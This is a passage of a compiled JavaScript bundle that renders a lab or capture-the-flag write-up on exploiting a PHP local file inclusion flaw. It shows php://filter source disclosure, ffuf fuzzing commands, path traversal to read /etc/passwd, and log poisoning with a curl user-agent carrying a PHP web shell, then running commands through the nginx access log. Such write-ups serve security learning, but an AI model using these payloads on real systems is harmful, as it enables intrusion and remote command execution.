recent"}),"\n",(0,a.jsx)(n.li,{children:"Null byte: N/A PHP version is recent"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"Let's try with more complex bypasses:"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"http://94.237.49.11:31840/index.php?page=php://filter/read=convert.base64-encode/resource=main",children:"http://94.237.49.11:31840/index.php?page=php://filter/read=convert.base64-encode/resource=main"})}),"\n",(0,a.jsx)(n.p,{children:"Worked and return the content of the main.php in base64"}),"\n",(0,a.jsxs)(n.p,{children:["In index.php we discover a commented piece of code that makes reference to ",(0,a.jsx)(n.code,{children:"ilf_admin/index.php"}),". If we try to access that page, we get something interesting showing some logs. Worth remembering: ",(0,a.jsx)(n.a,{href:"http://94.237.49.11:31840/ilf_admin/index.php?log=system.log",children:"http://94.237.49.11:31840/ilf_admin/index.php?log=system.log"})]}),"\n",(0,a.jsx)(n.p,{children:"The filtering mechanism looks quite simple:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:'  $page = $_GET[\'page\'];\n  if (strpos($page, "..") !== false) {\n    include "error.php";\n  }\n  else {\n    include $page . ".php";\n  }\n'})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"http://94.237.49.11:31840/index.php?page=%252e%252e%252fetc%252fpasswd",children:"http://94.237.49.11:31840/index.php?page=%252e%252e%252fetc%252fpasswd"})}),"\n",(0,a.jsx)(n.p,{children:"Looks like might be vulnerable to double encoding, however we're only bypassing the first if and the include only let us include php files."}),"\n",(0,a.jsxs)(n.p,{children:["Let's get back to ",(0,a.jsx)(n.a,{href:"http://94.237.49.11:31840/ilf_admin/index.php",children:"http://94.237.49.11:31840/ilf_admin/index.php"})]}),"\n",(0,a.jsx)(n.p,{children:"We can try to brute-force some directories:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ffuf -w /opt/github/SecLists/Discovery/Web-Content/combined_directories.txt:FUFF -u http://94.237.49.11:31840/ilf_admin/FUFF.php\nffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.49.11:31840/ilf_admin/index.php?FUZZ=value' -fl 102\n"})}),"\n",(0,a.jsx)(n.p,{children:"Nothing revealed."}),"\n",(0,a.jsx)(n.p,{children:"However, we can try the LFI directly in the log paramter:"}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.a,{href:"http://94.237.49.11:31840/ilf_admin/index.php?log=../../error.php",children:"http://94.237.49.11:31840/ilf_admin/index.php?log=../../error.php"})," and it worked!"]}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.a,{href:"http://94.237.49.11:31840/ilf_admin/index.php?log=../../../../../etc/passwd",children:"http://94.237.49.11:31840/ilf_admin/index.php?log=../../../../../etc/passwd"})," we have read the passwd file!"]}),"\n",(0,a.jsx)(n.p,{children:"In order to have Remote Code Excecution, let's try to see if we can have Remote File Inclusion and add our shell."}),"\n",(0,a.jsxs)(n.p,{children:["We cannot include Remote files, checking the nginx error log, looks like they might be using ",(0,a.jsx)(n.code,{children:"file_get_contents"})," or something like this."]}),"\n",(0,a.jsxs)(n.p,{children:["Given we have access to logs, we can poison them and force ",(0,a.jsx)(n.code,{children:"ilf_admin"})," to execute them by setting the user-agent of curl:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'curl -s "http://94.237.59.185:42603/index.php" -A "<?php system($_GET[\'cmd\']); ?>"\n'})}),"\n",(0,a.jsx)(n.p,{children:"And now we have a web shell running in the logs page:"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"http://94.237.59.185:42603/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id",children:"http://94.237.59.185:42603/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id"})}),"\n",(0,a.jsx)(n.p,{children:"From here we can move to a reverse shell"})]})}function c(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(h,{...e})}):h(e)}},8453:(e,n,i)=>{i.d(n,{R:()=>l,x:()=>r});var s=i(6540);const a={},t=s.createContext(a);function l(e){const n=s.useContext(t);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:l(e.components),s.createElement(t.Provider,{value:n},e.children)}}}]);